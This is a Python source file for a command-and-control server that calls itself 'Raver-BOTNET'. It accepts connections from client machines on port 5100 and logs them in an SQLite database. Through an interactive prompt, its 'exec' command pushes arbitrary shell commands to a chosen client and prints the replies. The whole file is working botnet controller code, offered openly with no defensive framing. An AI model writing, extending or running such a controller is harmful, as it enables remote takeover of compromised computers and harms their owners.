#!/usr/bin/python3
import socket
import threading
from colorama import Fore
import os
from os import name, system
import uuid
import shlex
import sqlite3

def RaverText():
    print(Fore.RED + """
 /$$$$$$$                                                  /$$$$$$$   /$$$$$$  /$$$$$$$$ /$$   /$$ /$$$$$$$$ /$$$$$$$$
| $$__  $$                                                | $$__  $$ /$$__  $$|__  $$__/| $$$ | $$| $$_____/|__  $$__/
| $$  \ $$  /$$$$$$  /$$    /$$ /$$$$$$   /$$$$$$         | $$  \ $$| $$  \ $$   | $$   | $$$$| $$| $$         | $$   
| $$$$$$$/ |____  $$|  $$  /$$//$$__  $$ /$$__  $$ /$$$$$$| $$$$$$$ | $$  | $$   | $$   | $$ $$ $$| $$$$$      | $$   
| $$__  $$  /$$$$$$$ \  $$/$$/| $$$$$$$$| $$  \__/|______/| $$__  $$| $$  | $$   | $$   | $$  $$$$| $$__/      | $$   
| $$  \ $$ /$$__  $$  \  $$$/ | $$_____/| $$              | $$  \ $$| $$  | $$   | $$   | $$\  $$$| $$         | $$   
| $$  | $$|  $$$$$$$   \  $/  |  $$$$$$$| $$              | $$$$$$$/|  $$$$$$/   | $$   | $$ \  $$| $$$$$$$$   | $$   
|__/  |__/ \_______/    \_/    \_______/|__/              |_______/  \______/    |__/   |__/  \__/|________/   |__/   
                                                                                                                      
by DontDieInVain V:0.0.0.1
    """)

def Clear():
    if name == "nt":
        os.system("cls")
    else:
        os.system("clear")

host = "0.0.0.0"
port = 5100
lock = threading.Lock()
conn = sqlite3.connect('clients.db')
cursor = conn.cursor()
active_clients = {}

def create_tables():
    cursor.execute('''
    CREATE TABLE IF NOT EXISTS clients (
        id INTEGER PRIMARY KEY AUTOINCREMENT,
        ip TEXT NOT NULL,
        port INTEGER NOT NULL
    )
    ''')

    cursor.execute('''
    CREATE TABLE IF NOT EXISTS offline_clients (
        id INTEGER PRIMARY KEY AUTOINCREMENT,
        ip TEXT NOT NULL,
        port INTEGER NOT NULL
    )
    ''')

    conn.commit()

def handle_client(conn, addr):
    if addr[0] in active_clients:
        conn.close()
        return
    active_clients[addr[0]] = conn
    save_client(addr[0], addr[1])
    print(f"[+] Connection {addr[0]}:{addr[1]}")
    
    threading.Thread(target=listen_client, args=(conn, addr[0]), daemon=True).start()

def save_client(ip, port):
    with sqlite3.connect('clients.db', check_same_thread=False) as conn:  
        cursor = conn.cursor()

        cursor.execute("SELECT id FROM clients WHERE ip = ?", (ip,))
        existing = cursor.fetchone()
        if existing:
            print(f"Client {ip} already exists")
            return

        cursor.execute('''
        INSERT INTO clients (ip, port)
        VALUES (?, ?)
        ''', (ip, port))
        conn.commit()

def remove_client(client_ip):
    with sqlite3.connect('clients.db', check_same_thread=False) as conn:  
        cursor = conn.cursor()
        
        cursor.execute('''
        INSERT INTO offline_clients (ip, port)
        SELECT ip, port FROM clients WHERE ip = ?
        ''', (client_ip,))
        conn.commit()

        cursor.execute('''
        DELETE FROM clients WHERE ip = ?
        ''', (client_ip,))
        conn.commit()

        if client_ip in active_clients:
            del active_clients[client_ip]

def repl():
    while True:
        try:
            line = input("(Raver-BOTNET)> ").strip()
            if not line:
                continue
            parts = shlex.split(line)  
            cmd, *args = parts
            func = COMMANDS.get(cmd)
            if func:
                func(args)
            else:
                print("Unknown command:", cmd)
        except SystemExit:
            break
        except Exception as e:
            print("Error:", e)

def cmd_help(args):
    print("""
--------------------------
help - Show this message
        
clients - Show Clients

exec - Execute a command in a client 

screenshot - Take a screenshot

remove - remove a client

exit - Quit the program
--------------------------

    """)
def cmd_clients(args):
    print("Online Clients")
    with sqlite3.connect('clients.db', check_same_thread=False) as conn:
        cursor = conn.cursor()
        cursor.execute('SELECT * FROM clients')
        online_clients = cursor.fetchall()
        for client in online_clients:
            print(f"ID: {client[0]} | {client[1]}:{client[2]}")

    print("\nOffline Clients")
    with sqlite3.connect('clients.db', check_same_thread=False) as conn:
        cursor = conn.cursor()
        cursor.execute('SELECT * FROM offline_clients')
        offline_clients = cursor.fetchall()
        for offline_client in offline_clients:
            print(f"ID: {offline_client[0]} | {offline_client[1]}:{offline_client[2]}")

def cmd_exec(args):
    if len(args) < 2:
        print("Usage: exec <ip> <command>")
        return
    target_ip = args[0]
    command = " ".join(args[1:]) 

    target_client = active_clients.get(target_ip)
    if not target_client:
        print(f"[!] Cliente com ID {target_ip} não está conectado.")
        return

    try:
        send(target_ip, command, target_client)
    except Exception as e:
        print(f"[!] Failed to send command: {e}")

def cmd_screenshot(args):
    print("Still being made")

def cmd_remove(args):
    if len(args) < 1:
        print("Usage: remove <ip> ")
        return
    client_ip = args[0]
    with sqlite3.connect('clients.db', check_same_thread=False) as conn:  
        cursor = conn.cursor()
        
        cursor.execute('''
        DELETE FROM clients WHERE ip = ?
        ''', (client_ip,))
        conn.commit()

def send(target_ip, command, target_client):
    target_client.send(command.encode())
    print(f"[>] Command sent to {target_ip}: {command}")
        
def listen_client(conn, client_ip):
    while True:
        try:
            while True:
                data = conn.recv(4096).decode().strip()
                if data:
                     print(f"[<] Mensagem de {client_ip}:\n{data}")
        except ConnectionResetError:
            print(f"[!] Client {client_ip} disconected")
            remove_client(client_ip)
            break
        except KeyboardInterrupt:
            print(f"[!] Client {client_ip} disconected")
            remove_client(client_ip)
            break
        except Exception as e:
            print(f"[!] Error on receive message from {client_ip}: {e}")
            break
        finally:
            conn.close()

COMMANDS = {
    "help": cmd_help,
    "clients": cmd_clients,
    "exec": cmd_exec,
    "screenshot": cmd_screenshot,
    "remove": cmd_remove,
    "quit": lambda args: (_ for _ in ()).throw(SystemExit())  # lançar SystemExit para sair
}

if __name__ == "__main__":
    Clear()
    RaverText()
    create_tables()
    with socket.socket(socket.AF_INET, socket.SOCK_STREAM) as s:
        s.bind((host, port))
        s.listen()
        print(Fore.GREEN + f"Server listening on port {port}")
        print("Type help for commands")
        threading.Thread(target=repl, daemon=True).start()
        while True:
            conn, addr = s.accept()  # addr = (ip, port)
            t = threading.Thread(target=handle_client, args=(conn, addr), daemon=True).start()
